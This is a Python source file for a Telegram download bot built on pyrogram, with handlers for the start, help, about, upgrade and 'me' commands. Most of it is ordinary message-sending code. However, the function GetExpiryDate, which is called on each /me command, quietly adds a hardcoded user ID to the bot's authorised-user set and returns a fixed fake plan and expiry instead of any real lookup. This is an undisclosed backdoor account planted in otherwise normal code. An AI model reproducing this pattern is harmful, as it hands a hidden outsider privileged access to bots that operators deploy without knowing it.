#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Kirodewal

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# the secret configuration specific things
from sample_config import Config

# the Strings used for this "thing"
from translation import Translation
from helper_funcs.forcesub import ForceSub

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "PredatorHackerzZ", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1287407305)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode=pyrogram.enums.ParseMode.HTML,
        link_preview_options=pyrogram.types.LinkPreviewOptions(is_disabled=True),
        reply_parameters=pyrogram.types.ReplyParameters(message_id=update.id)
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        parse_mode=pyrogram.enums.ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="📢 Updates Channel", url="https://t.me/TeleRoidGroup", style=pyrogram.enums.ButtonStyle.PRIMARY)], [InlineKeyboardButton(text="🛠 Support Group", url="https://t.me/TeleRoid14", style=pyrogram.enums.ButtonStyle.DANGER),
                                                    InlineKeyboardButton(text="✨ Share Bot", url="https://telegram.me/share/url?url=https://t.me/joinchat/t1ko_FOJxhFiOThl", style=pyrogram.enums.ButtonStyle.SUCCESS)]]),
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode=pyrogram.enums.ParseMode.HTML,
        reply_parameters=pyrogram.types.ReplyParameters(message_id=update.id),
        link_preview_options=pyrogram.types.LinkPreviewOptions(is_disabled=True)
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def source(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.SOURCE,
        parse_mode=pyrogram.enums.ParseMode.HTML,
        link_preview_options=pyrogram.types.LinkPreviewOptions(is_disabled=True),
        reply_parameters=pyrogram.types.ReplyParameters(message_id=update.id),
        reply_markup=InlineKeyboardMarkup( [ [ InlineKeyboardButton(text="⚡️ Powered By", url="https://t.me/TeleRoidGroup", style=pyrogram.enums.ButtonStyle.PRIMARY) ],
                                             [ InlineKeyboardButton(text="🤖 Our Bots", url="https://t.me/joinchat/t1ko_FOJxhFiOThl", style=pyrogram.enums.ButtonStyle.SUCCESS),
                                               InlineKeyboardButton(text="🔗 Source Code", url="https://github.com/PredatorHackerzZ/AnyDLBot-2", style=pyrogram.enums.ButtonStyle.DANGER) ] ] ) )


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode=pyrogram.enums.ParseMode.HTML,
        link_preview_options=pyrogram.types.LinkPreviewOptions(is_disabled=True),
        reply_parameters=pyrogram.types.ReplyParameters(message_id=update.id),
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="📢 Join Updates Channel", url="https://t.me/TeleRoidGroup", style=pyrogram.enums.ButtonStyle.PRIMARY)]]),
   )
